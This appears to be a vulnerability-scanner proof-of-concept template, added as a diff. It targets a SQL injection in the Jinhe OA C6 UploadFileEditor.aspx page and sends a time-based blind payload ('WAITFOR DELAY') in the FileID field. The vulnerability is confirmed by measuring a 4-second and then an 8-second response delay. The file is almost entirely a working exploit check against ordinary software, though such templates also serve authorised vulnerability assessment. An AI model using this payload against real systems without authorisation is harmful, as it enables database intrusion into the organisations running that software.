@@ -1,0 +1,29 @@
+name: poc-yaml-jinheOA-C6-UploadFileEditor.aspx-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /C6/Control/UploadFileEditor.aspx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: FileID=1';WAITFOR+DELAY'0:0:4'--+
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /C6/Control/UploadFileEditor.aspx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: FileID=1';WAITFOR+DELAY'0:0:8'--+
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486549&idx=1&sn=54e990447a5e509952737d9317e14fc0&chksm=c267b966f5103070a82843d8ca5bdd42325538ac37349800fde58ca81fc5679bea83163222e0&token=1628549949&lang=zh_CN#rd
